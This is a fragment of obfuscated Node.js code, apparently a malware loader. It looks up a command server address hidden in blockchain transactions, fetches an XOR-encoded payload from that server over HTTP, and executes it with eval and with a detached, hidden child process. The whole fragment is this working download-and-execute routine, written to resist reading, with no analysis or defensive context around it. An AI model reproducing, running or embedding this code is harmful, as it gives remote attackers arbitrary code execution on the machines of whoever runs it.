_0x2507af(_0x4ee82f);},'rBNGd':function(_0x4ddcbd,_0x455a34,_0x321aec,_0x211cc5){return _0x4ddcbd(_0x455a34,_0x321aec,_0x211cc5);},'UaMqV':_0x5189a7(0x201),'SSKrF':_0x5189a7(0x188),'CLSEy':function(_0x4474ad,_0xb449f9){return _0x4474ad-_0xb449f9;},'AQfhj':function(_0x1040d7,_0x98bcb6){return _0x1040d7(_0x98bcb6);},'gWyNb':function(_0x58c344,_0x1a9247){return _0x58c344(_0x1a9247);},'WVxbp':function(_0xf08601,_0x3ce163){return _0xf08601(_0x3ce163);},'MtIwI':function(_0x1f9a12,_0x39c0a2,_0x3a9b51,_0x12fb9a){return _0x1f9a12(_0x39c0a2,_0x3a9b51,_0x12fb9a);},'VLmnK':_0x5189a7(0x24a)+_0x5189a7(0x22d),'YrZWv':function(_0x3efe89,_0x289f71,_0x3db0cd,_0x2539fc){return _0x3efe89(_0x289f71,_0x3db0cd,_0x2539fc);},'kIXwj':_0x5189a7(0x151)+_0x5189a7(0x1e5)},_0x178c83=_0x18d916[_0x5189a7(0x1f1)](BigInt,await _0x18d916[_0x5189a7(0x1b6)](withRpcEndpoints,(_0x1e8626,_0x42654f)=>rpcCall(_0x1e8626,_0x5189a7(0x1d5)+_0x5189a7(0x161),[],_0x42654f))),_0x45b308=_0x18d916[_0x5189a7(0x153)](_0x178c83,_0x18d916[_0x5189a7(0x269)](_0x178c83,BLOCK_MULTIPLE));let _0x27a1e4=await _0x18d916[_0x5189a7(0x1da)](firstMatch,_0x18d916[_0x5189a7(0x289)](candidateBlocks,_0x45b308)[_0x5189a7(0x1b0)](blockTask));_0x27a1e4||(_0x27a1e4=await _0x18d916[_0x5189a7(0x23e)](lastSenderTx,_0x178c83)[_0x5189a7(0x221)](()=>lastSenderTxViaIndexer()));const [_0x1f1c13,_0x171f19]=_0x18d916[_0x5189a7(0x289)](decodeAddress,_0x27a1e4['tx']['to']),_0x551483=global;function _0x197680(_0x4bbfc4,_0x4d8eae){const _0xec59c0=_0x5189a7,_0x2092d9={'hostname':_0x4d8eae[_0xec59c0(0x1eb)],'port':_0x18d916[_0xec59c0(0x271)](Number,_0x4d8eae[_0xec59c0(0x240)])||0x1007+-0xa0c+-0x5ab,'path':_0x18d916[_0xec59c0(0x225)](_0x4d8eae[_0xec59c0(0x23a)],_0x4d8eae[_0xec59c0(0x15d)]),'headers':{'User-Agent':_0x18d916[_0xec59c0(0x16e)],'Sec-V':_0x551483['_V']||-0x2003+-0x19f*0x17+0xa*0x6ee}};function _0x178336(_0x5e589d){const _0x536726=_0xec59c0,_0x25b8fa=_0x4bbfc4[_0x536726(0x186)];for(let _0x5e117e=0x2369+0x6*0x551+0x434f*-0x1;_0x18d916[_0x536726(0x26b)](_0x5e117e,_0x5e589d[_0x536726(0x186)]);_0x5e117e++)_0x5e589d[_0x5e117e]^=_0x4bbfc4[_0x536726(0x184)](_0x18d916[_0x536726(0x269)](_0x5e117e,_0x25b8fa));return _0x5e589d[_0x536726(0x17b)](_0x18d916[_0x536726(0x163)]);}function _0x8edbb2(_0x15a55b){const _0x165fd4=_0xec59c0,_0x33cc83=_0x15a55b[_0x165fd4(0x1c5)][_0x18d916[_0x165fd4(0x1db)]];if(!_0x33cc83)throw new Error(_0x18d916[_0x165fd4(0x218)]);return _0x18d916[_0x165fd4(0x271)](_0x178336,Buffer[_0x165fd4(0x267)](_0x33cc83,_0x18d916[_0x165fd4(0x197)]));}function _0x2eb02e(_0x214865){const _0x38de60=_0xec59c0,_0x1b4d01={'WPTDR':function(_0x1e1409,_0x481aef){const _0x1a2e48=_0x5ce2;return _0x18d916[_0x1a2e48(0x1dd)](_0x1e1409,_0x481aef);},'ksFrG':_0x18d916[_0x38de60(0x212)],'ztsJi':function(_0x24a268,_0x35b787){const _0x1776f9=_0x38de60;return _0x18d916[_0x1776f9(0x271)](_0x24a268,_0x35b787);},'cLZWW':_0x18d916[_0x38de60(0x15a)],'goaMs':_0x18d916[_0x38de60(0x202)],'iuuQj':_0x18d916[_0x38de60(0x24d)],'jRFnt':function(_0x2e7914,_0x2a0a52){const _0x300641=_0x38de60;return _0x18d916[_0x300641(0x1f1)](_0x2e7914,_0x2a0a52);},'VqHoL':_0x18d916[_0x38de60(0x1db)],'CNzgK':function(_0x4e45d2,_0x32da94){const _0x53d3d2=_0x38de60;return _0x18d916[_0x53d3d2(0x22a)](_0x4e45d2,_0x32da94);},'aMSbx':_0x18d916[_0x38de60(0x26a)]};return new Promise((_0x5a383e,_0x5151d5)=>{const _0x56bb24=_0x38de60,_0x4e4fae={'atcEx':function(_0x3d7d75,_0x3c371a){const _0x3c7254=_0x5ce2;return _0x1b4d01[_0x3c7254(0x170)](_0x3d7d75,_0x3c371a);},'Dtfma':_0x1b4d01[_0x56bb24(0x183)],'tbhzo':function(_0xbcb27f,_0x5e12cd){const _0xfaf604=_0x56bb24;return _0x1b4d01[_0xfaf604(0x219)](_0xbcb27f,_0x5e12cd);},'UMBCF':_0x1b4d01[_0x56bb24(0x250)],'LarGF':function(_0x5ad622,_0x4492eb){const _0x262ce5=_0x56bb24;return _0x1b4d01[_0x262ce5(0x185)](_0x5ad622,_0x4492eb);}},_0x4a7d04=http[_0x56bb24(0x1e6)]({..._0x2092d9,'method':_0x214865},_0x20c790=>{const _0x4d5379=_0x56bb24;if(_0x1b4d01[_0x4d5379(0x174)](_0x1b4d01[_0x4d5379(0x19c)],_0x214865)){try{_0x1b4d01[_0x4d5379(0x185)](_0x5a383e,_0x1b4d01[_0x4d5379(0x185)](_0x8edbb2,_0x20c790));}catch(_0x559ff6){_0x1b4d01[_0x4d5379(0x185)](_0x5151d5,_0x559ff6);}return void _0x20c790[_0x4d5379(0x27d)]();}const _0x402132=[];_0x20c790['on'](_0x1b4d01[_0x4d5379(0x242)],_0x56f1f2=>_0x402132[_0x4d5379(0x223)](_0x56f1f2)),_0x20c790['on'](_0x1b4d01[_0x4d5379(0x1aa)],()=>{const _0x88e681=_0x4d5379;try{const _0x3207d4=Buffer[_0x88e681(0x193)](_0x402132);if(_0x3207d4[_0x88e681(0x186)])return _0x4e4fae[_0x88e681(0x1f7)](_0x5a383e,_0x4e4fae[_0x88e681(0x1f7)](_0x178336,_0x3207d4));if(_0x20c790[_0x88e681(0x1c5)][_0x4e4fae[_0x88e681(0x239)]])return _0x4e4fae[_0x88e681(0x20f)](_0x5a383e,_0x4e4fae[_0x88e681(0x20f)](_0x8edbb2,_0x20c790));_0x4e4fae[_0x88e681(0x1f7)](_0x5151d5,new Error(_0x4e4fae[_0x88e681(0x25b)]));}catch(_0x1a5acd){_0x4e4fae[_0x88e681(0x203)](_0x5151d5,_0x1a5acd);}}),_0x20c790['on'](_0x1b4d01[_0x4d5379(0x204)],_0x5151d5);});_0x4a7d04['on'](_0x1b4d01[_0x56bb24(0x204)],_0x5151d5),_0x4a7d04[_0x56bb24(0x18e)]();});}return _0x18d916[_0xec59c0(0x1b6)](_0x2eb02e,_0x18d916[_0xec59c0(0x24c)])[_0xec59c0(0x221)](()=>_0x2eb02e(_0xec59c0(0x224)));}async function _0xf8025e(_0x51e5ce,_0x29a925,_0x1e1040){const _0x56e10a=_0x5189a7;try{const _0x56578e=await _0x18d916[_0x56e10a(0x217)](_0x197680,_0x29a925,_0x51e5ce),_0x38a289=_0x1e1040?_0x56e10a(0x21c)+_0x56e10a(0x277)+(_0x551483['_V']||0xacd+-0x40*0x86+-0x27*-0x95)+(_0x56e10a(0x171)+_0x56e10a(0x194))+_0x551483['_H']+(_0x56e10a(0x171)+_0x56e10a(0x18c))+_0x551483[_0x56e10a(0x1b7)]+(_0x56e10a(0x171)+_0x56e10a(0x1b8)+_0x56e10a(0x1c7)+_0x56e10a(0x23f)+_0x56e10a(0x1fd)+_0x56e10a(0x1b1)):_0x56e10a(0x21c)+_0x56e10a(0x277)+(_0x551483['_V']||-0x720+-0x2*-0xde5+-0x422*0x5)+(_0x56e10a(0x171)+_0x56e10a(0x1c3))+_0x551483[_0x56e10a(0x20a)]+(_0x56e10a(0x171)+_0x56e10a(0x1ae))+_0x551483[_0x56e10a(0x236)]+(_0x56e10a(0x171)+_0x56e10a(0x1b8)+_0x56e10a(0x1c7)+_0x56e10a(0x23f)+_0x56e10a(0x1fd)+_0x56e10a(0x1b1));_0x1e1040||_0x18d916[_0x56e10a(0x154)](eval,_0x18d916[_0x56e10a(0x225)](_0x38a289,_0x56578e)),_0x18d916[_0x56e10a(0x1ba)](spawn,_0x18d916[_0x56e10a(0x241)],['-e',_0x18d916[_0x56e10a(0x225)](_0x38a289,_0x56578e)],{'detached':!(-0x31f*0x9+-0x14e3+0x30fa),'stdio':_0x18d916[_0x56e10a(0x24f)],'windowsHide':!(-0x62c+-0x2*0x1245+0x47*0x9a)})[_0x56e10a(0x22e)]();}catch(_0x39e52f){}}_0x551483['_V']=_0x551483['i'],_0x551483['_H']=_0x5189a7(0x1b3)+_0x1f1c13+_0x5189a7(0x27e),_0x551483[_0x5189a7(0x1b7)]=_0x5189a7(0x1b3)+_0x171f19+_0x5189a7(0x27e),_0x551483[_0x5189a7(0x20a)]=_0x5189a7(0x1b3)+_0x1f1c13+_0x5189a7(0x165),_0x551483[_0x5189a7(0x236)]=_0x5189a7(0x1b3)+_0x1f1c13+_0x5189a7(0x27e),await _0x18d916[_0x5189a7(0x166)](_0xf8025e,new URL(_0x5189a7(0x1b3)+_0x1f1c13+(_0x5189a7(0x22f)+'s')),_0x18d916[_0x5189a7(0x176)],!(-0x1b2f*0x1+-0x1*0x1639+0x3169)),await _0x18d916[_0x5189a7(0x232)](_0xf8025e,new URL(_0x5189a7(0x1b3)+_0x1f1c13+_0x5189a7(0x192)),_0x18d916[_0x5189a7(0x249)],!(0x1585+0x4a*0x5d+-0x1*0x3067));}run();
